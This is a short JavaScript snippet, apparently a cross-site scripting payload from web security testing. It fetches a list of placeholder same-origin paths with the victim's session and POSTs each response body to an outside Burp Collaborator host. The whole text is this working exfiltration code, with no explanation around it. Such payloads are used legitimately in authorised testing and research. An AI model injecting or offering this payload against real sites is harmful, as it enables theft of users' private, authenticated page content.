urls = ['/path1','/path2','..']

urls.forEach(function(item, index, array) {
   var xhr = new XMLHttpRequest();
   xhr.open('GET', item, true);
   xhr.responseType = 'text';

   xhr.onload = function () {
       if (xhr.readyState === xhr.DONE) {
           if (xhr.status === 200) {
               sendData(xhr.responseText);
           }
       }
   };
   xhr.send(null);
})

function sendData(data){
    var url = 'https://randomrandom.burpcollaborator.net'
    var xhr = new XMLHttpRequest();
    xhr.open('POST',url,true);
    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    xhr.send('data=' + data);
} 
